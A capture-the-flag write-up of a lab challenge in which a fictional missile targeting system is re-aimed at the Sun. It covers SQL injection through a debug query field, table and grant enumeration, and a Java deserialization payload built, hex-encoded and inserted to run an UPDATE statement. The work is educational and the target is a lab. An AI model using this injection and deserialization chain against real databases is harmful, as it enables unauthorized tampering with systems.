## Objective
Thwart Jack's evil plan by re-aiming his missile at the Sun.

## Solution

#### Enable the missile targetting system app and get the directory service URI

```
....
INFO: URI: maltcp://10.1.1.1:1025/missile-targeting-system-Directory
```
#### Connect to the Parameter Service


#### Injecting SQL Queries to find the correct injection point

```
;USER();
```

````
[ WARN] (ActionsExecutor-thread-2) Error: 1064-42000: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'USER()' at line 1
2023-12-28 16:17:33.951 esa.mo.nmf.apps.MissileTargetingSystemMCAdapter sqlDebug
WARNING: Debug action error: java.sql.SQLSyntaxErrorException: (conn=676) You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'USER()' at line 1
2023-12-28 16:17:33.957 esa.mo.nmf.apps.MissileTargetingSystemMCAdapter sqlDebug
WARNING: Debug action query: SELECT VERSION();USER();
````

```
;SELECT USER();
```
```
USER(): targeter@172.18.0.3 | 
```

#### Getting the rights on the tables
```SQL
;SHOW GRANTS;
```
```
Grants for targeter@%: GRANT USAGE ON *.* TO `targeter`@`%` IDENTIFIED BY PASSWORD '*41E2CFE844C8F1F375D5704992440920F11A11BA' | 
Grants for targeter@%: GRANT SELECT, INSERT ON `missile_targeting_system`.`satellite_query` TO `targeter`@`%` | 
Grants for targeter@%: GRANT SELECT ON `missile_targeting_system`.`pointing_mode` TO `targeter`@`%` | 
Grants for targeter@%: GRANT SELECT ON `missile_targeting_system`.`messaging` TO `targeter`@`%` | 
Grants for targeter@%: GRANT SELECT ON `missile_targeting_system`.`target_coordinates` TO `targeter`@`%` | 
Grants for targeter@%: GRANT SELECT ON `missile_targeting_system`.`pointing_mode_to_str` TO `targeter`@`%` | 
```

#### Dumping tables data for juicy information
```SQL
;SELECT * FROM pointing_mode_to_str;
```
```
id: 1 | numerical_mode: 0 | str_mode: Earth Point Mode | str_desc: When pointing_mode is 0, targeting system applies the target_coordinates to earth. | 
id: 2 | numerical_mode: 1 | str_mode: Sun Point Mode | str_desc: When pointing_mode is 1, targeting system points at the sun, ignoring the coordinates. | 
```
#### Dumping the Java Serialized Data and the automation script
```SQL
;DESCRIBE satellite_query;
```
- Column ```jid``` probably is "Job ID" , ```objects``` field is the Java serialized payload and ```results``` is the output generated after executing the serialized payload 
```
COLUMN_NAME: jid | COLUMN_TYPE: int(11) | IS_NULLABLE: NO | COLUMN_KEY: PRI | COLUMN_DEFAULT: null | EXTRA: auto_increment | 
COLUMN_NAME: object | COLUMN_TYPE: blob | IS_NULLABLE: YES | COLUMN_KEY:  | COLUMN_DEFAULT: null | EXTRA:  | 
COLUMN_NAME: results | COLUMN_TYPE: text | IS_NULLABLE: YES | COLUMN_KEY:  | COLUMN_DEFAULT: null | EXTRA:  | 
```
```SQL
;SELECT * FROM satellite_query;
```
```Java
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.stream.Collectors;
import java.util.stream.Stream;
import java.sql.*;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import com.google.gson.Gson;

public class SatelliteQueryFileFolderUtility implements Serializable {
    private String pathOrStatement;
    private boolean isQuery;
    private boolean isUpdate;

    public SatelliteQueryFileFolderUtility(String pathOrStatement, boolean isQuery, boolean isUpdate) {
        this.pathOrStatement = pathOrStatement;
        this.isQuery = isQuery;
        this.isUpdate = isUpdate;
    }

    public String getResults(Connection connection) {
        if (isQuery && connection != null) {
            if (!isUpdate) {
                try (PreparedStatement selectStmt = connection.prepareStatement(pathOrStatement);
                    ResultSet rs = selectStmt.executeQuery()) {
                    List<HashMap<String, String>> rows = new ArrayList<>();
                    while(rs.next()) {
                        HashMap<String, String> row = new HashMap<>();
                        for (int i = 1; i <= rs.getMetaData().getColumnCount(); i++) {
                            String key = rs.getMetaData().getColumnName(i);
                            String value = rs.getString(i);
                            row.put(key, value);
                        }
                        rows.add(row);
                    }
                    Gson gson = new Gson();
                    String json = gson.toJson(rows);
                    return json;
                } catch (SQLException sqle) {
                    return "SQL Error: " + sqle.toString();
                }
            } else {
                try (PreparedStatement pstmt = connection.prepareStatement(pathOrStatement)) {
                    pstmt.executeUpdate();
                    return "SQL Update completed.";
                } catch (SQLException sqle) {
                    return "SQL Error: " + sqle.toString();
                }
            }
        } else {
            Path path = Paths.get(pathOrStatement);
            try {
                if (Files.notExists(path)) {
                    return "Path does not exist.";
                } else if (Files.isDirectory(path)) {
                    // Use try-with-resources to ensure the stream is closed after use
                    try (Stream<Path> walk = Files.walk(path, 1)) { // depth set to 1 to list only immediate contents
                        return walk.skip(1) // skip the directory itself
                                .map(p -> Files.isDirectory(p) ? "D: " + p.getFileName() : "F: " + p.getFileName())
                                .collect(Collectors.joining("\n"));
                    }
                } else {
                    // Assume it's a readable file
                    return new String(Files.readAllBytes(path), StandardCharsets.UTF_8);
                }
            } catch (IOException e) {
                return "Error reading path: " + e.toString();
            }
        }
    }

    public String getpathOrStatement() {
        return pathOrStatement;
    }
}
```
### Attack Methodology
- Create a query to update the table ```pointing_mode``` : ```UPDATE pointing_mode SET numerical_mode = 1 WHERE id = 1```
- Create a serialized object of the same class we found above and dump the serialized data in HEX format
- Insert the serialized data in the ```missile_targeting_system``` table

```Java
import java.io.*;
public class SatSerial{
    public static void main(String[] args) {
        SatelliteQueryFileFolderUtility utility = new SatelliteQueryFileFolderUtility("UPDATE pointing_mode SET numerical_mode = 1 WHERE id = 1", true, true);
        String filename = "serializedUtility.ser";
        serializeObject(utility, filename);
    }

    public static void serializeObject(SatelliteQueryFileFolderUtility object, String filename) {
        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(filename))) {
            oos.writeObject(object);
            System.out.println("Object serialized successfully.");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

#### Compile and Generate the Serialized Payload
```
javac -classpath ".:/home/kali/Desktop/hh/gson-2.10.1.jar" SatSerial.java
java SatSerial
```

#### Generate the Hex Serialized Payload
```bash
└─$ xxd -p -c 1000000 serializedUtility.ser                                  

aced00057372001f536174656c6c697465517565727946696c65466f6c6465725574696c69747912d4f68d0eb392cb0200035a0007697351756572795a000869735570646174654c000f706174684f7253746174656d656e747400124c6a6176612f6c616e672f537472696e673b7870010174003855504441544520706f696e74696e675f6d6f646520534554206e756d65726963616c5f6d6f6465203d2031205748455245206964203d2031
```

#### Send the new payload to the db
```SQL
;INSERT INTO satellite_query(jid,object) VALUES (6,UNHEX('aced00057372001f536174656c6c697465517565727946696c65466f6c6465725574696c69747912d4f68d0eb392cb0200035a0007697351756572795a000869735570646174654c000f706174684f7253746174656d656e747400124c6a6176612f6c616e672f537472696e673b7870010174003855504441544520706f696e74696e675f6d6f646520534554206e756d65726963616c5f6d6f6465203d2031205748455245206964203d2031'));
```

#### Verify
- If everything is correct the challenge will be auto completed
- We can verify the value of ```numerical_mode``` in pointing_mode
  
```SQL
;SELECT * FROM pointing_mode;
```
```
id: 1 | numerical_mode: 1 | 
```
